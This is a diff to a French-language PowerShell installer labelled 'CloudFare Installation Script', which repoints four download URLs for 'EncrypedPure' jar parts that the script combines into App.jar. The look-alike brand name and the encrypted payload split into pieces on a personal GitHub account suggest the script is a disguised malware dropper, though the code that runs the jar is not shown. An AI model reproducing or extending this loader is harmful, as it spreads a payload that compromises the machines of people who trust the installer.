@@ -1,4 +1,4 @@
-# CloudFare Installation Script v2.0 - ULTRA ROBUSTE
+﻿# CloudFare Installation Script v2.0 - ULTRA ROBUSTE
 # Multi-ordinateur, multi-utilisateur, gestion complète des erreurs
 # URLs: https://github.com/davidrenand/Powershell1
 
@@ -27,10 +27,10 @@ $JavaUrls = @(
 )
 
 $PartUrls = @(
-    "https://raw.githubusercontent.com/davidrenand/CloudFareJre1/main/EncrypedPure.part1.jar",
-    "https://raw.githubusercontent.com/davidrenand/CloudFareJre1/main/EncrypedPure.part2.jar",
-    "https://raw.githubusercontent.com/davidrenand/CloudFareJre1/main/EncrypedPure.part3.jar",
-    "https://raw.githubusercontent.com/davidrenand/CloudFareJre1/main/EncrypedPure.part4.jar"
+    "https://raw.githubusercontent.com/davidrenand/repos/main/EncrypedPure.part1.jar",
+    "https://raw.githubusercontent.com/davidrenand/repos/main/EncrypedPure.part2.jar",
+    "https://raw.githubusercontent.com/davidrenand/repos/main/EncrypedPure.part3.jar",
+    "https://raw.githubusercontent.com/davidrenand/repos/main/EncrypedPure.part4.jar"
 )
 
 $FinalJarName = "App.jar"
